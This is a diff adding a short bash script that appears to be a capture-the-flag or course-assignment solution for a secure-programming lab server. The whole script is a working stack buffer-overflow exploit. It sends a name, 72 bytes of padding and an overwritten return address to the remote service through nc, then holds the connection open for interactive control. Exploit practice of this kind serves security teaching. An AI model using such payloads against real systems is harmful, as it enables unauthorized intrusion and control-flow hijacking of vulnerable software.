@@ -1,0 +1,2 @@
+#!/bin/bash
+(python -c 'print "heron\n" + "\x00"*72 + "\x0e\x86\x04\x08"' && cat) | nc secprog.cs.nctu.edu.tw 6666
